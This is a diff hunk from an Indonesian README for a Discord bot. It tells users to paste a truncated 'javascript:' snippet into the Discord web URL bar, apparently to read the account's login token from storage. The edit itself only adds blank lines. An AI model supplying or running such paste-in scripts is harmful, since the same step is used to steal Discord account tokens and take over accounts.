@@ -61,6 +61,8 @@ javascript:var i = document.createElement('iframe');i.onload = function(){var lo
 
 Buka Discord web, Copy Code diatas
 Paste di bar Url
+
+
 Kata "Javascript" biasanya terhapus sendiri oleh browser anda, jadi kalian bisa mengetiknya manual
 
 ## • RUN BOT
